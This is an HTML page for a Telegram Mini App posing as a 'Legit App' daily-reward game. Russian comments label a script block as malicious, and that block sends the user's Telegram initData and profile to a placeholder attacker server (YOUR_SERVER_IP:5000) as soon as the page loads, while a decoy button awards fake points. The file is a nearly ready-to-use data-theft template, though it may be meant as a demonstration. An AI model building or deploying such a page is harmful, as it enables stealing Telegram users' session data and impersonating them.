<!-- public/index.html -->
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <title>Legit Mini App</title>
    <style>
        body { font-family: system-ui; padding: 20px; text-align: center; }
        .card { background: #f5f5f5; padding: 20px; border-radius: 12px; margin-top: 20px; }
        button { background: #0088cc; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🎁 Welcome to Legit App!</h1>
    <p>You are logged in as <span id="username">Loading...</span></p>
    <div class="card">
        <p>🔥 You have 0 points</p>
        <button id="claimBtn">Claim Daily Reward</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();  // Разворачиваем на весь экран
        
        // Получаем данные пользователя из Telegram
        const user = tg.initDataUnsafe.user || { first_name: 'Anonymous' };
        document.getElementById('username').innerText = user.first_name;
        
        // ⚠️ ВРЕДОНОСНЫЙ КОД (в реальном эксплойте он скрыт)
        // Отправляем initData и userData на сервер злоумышленника
        const initData = tg.initData;
        const userData = JSON.stringify(user);
        
        fetch('http://YOUR_SERVER_IP:5000/api/init', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Init-Data': initData,
                'X-User-Data': userData
            }
        }).then(res => res.json())
          .then(data => console.log('Init sent:', data))
          .catch(err => console.error('Failed to send init:', err));
        
        // Обычная логика приложения
        document.getElementById('claimBtn').addEventListener('click', () => {
            alert("+10 points claimed!");
        });
    </script>
</body>
</html>
